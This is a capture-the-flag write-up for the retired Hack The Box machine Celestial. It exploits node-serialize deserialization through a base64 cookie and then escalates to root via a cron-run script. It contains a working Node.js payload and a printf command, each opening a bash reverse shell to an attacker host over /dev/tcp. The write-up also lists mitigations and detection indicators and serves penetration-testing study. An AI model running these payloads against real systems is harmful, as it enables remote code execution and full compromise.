---
machine: Celestial
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, nodejs, deserialization, node-serialize, cookie, cron, privesc]
---

# Celestial — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

An Express application stores a JSON object in a base64 cookie and deserializes it with `node-serialize`. The cookie accepts serialized functions, allowing code execution as `sun`. A root cron runs and restores a user-owned script every five minutes; modifying it between runs yields a root shell.

## Reconnaissance

```bash
nmap -Pn -sC -sV -p- <IP>
```

- Only port 3000 is exposed.
- The `X-Powered-By: Express` header identifies Node.js.
- The home page returns a message with a name and a number.

## Enumeration

The first request sets a base64 `profile` cookie:

```bash
echo '<COOKIE_B64>' | base64 -d
```

The content is JSON with `username`, `country`, `city` and `num`. Changing `num` and resending the cookie makes the server evaluate the sum; the object is deserialized on every request.

```bash
curl -s -b "profile=$(echo '<JSON>' | base64 -w0)" http://<IP>:3000/
```

The installed `node-serialize` version is vulnerable to code execution when the JSON contains the `_$$ND_FUNC$$_` marker.

## Foothold

Build a function that opens a connection and starts `/bin/sh`, serialize it, and append `()` so it runs during deserialization.

```javascript
const serialize = require('node-serialize');
const payload = {
  username: 'x',
  num: '1',
  rce: function () {
    require('child_process').exec("bash -c 'bash -i >& /dev/tcp/<LHOST>/443 0>&1'");
  }
};
console.log(serialize.serialize(payload).slice(0, -2) + '()' + serialize.serialize(payload).slice(-2));
```

Base64-encode the string and send it as the cookie. The shell runs as `sun`; `id` confirms it.

## Privilege escalation

`/home/sun/Documents` contains `script.py` and `user.txt`. `pspy` shows root running the script every five minutes, then restoring it from `/root/script.py` and resetting ownership, immutability and timestamps.

```bash
# Wait for the window between execution and restoration.
printf 'import os\nos.system("bash -c \\'bash -i >& /dev/tcp/<LHOST>/444 0>&1\\'")\n' > /home/sun/Documents/script.py
```

The cron executes the script as root before copying the original back. A root shell arrives at the listener.

## Evidence

- Decoded cookie and serialized payload, without the real address.
- `id` as `sun` and as root.
- `pspy` line showing the cron and the restore.
- Redacted flag.

## Lessons learned

- `unserialize` on client data is code execution, even when the format looks like JSON.
- An opaque base64 cookie provides no integrity.
- A cron that restores the script does not remove the execution window.

## Mitigations and detection

- Do not deserialize user-controlled objects; use JSON.parse and a strict schema.
- Sign or encrypt cookies and validate their content server-side.
- Run scheduled tasks as an unprivileged user and do not write to the script.
- Alert on cookies containing `_$$ND_FUNC$$_`, Node child processes and modifications to cron-executed scripts.

## References

- <https://www.hackthebox.com/machines/Celestial>
- <https://www.cve.org/CVERecord?id=CVE-2017-5941>
- <https://attack.mitre.org/techniques/T1059/007/>
- <https://attack.mitre.org/techniques/T1053/003/>
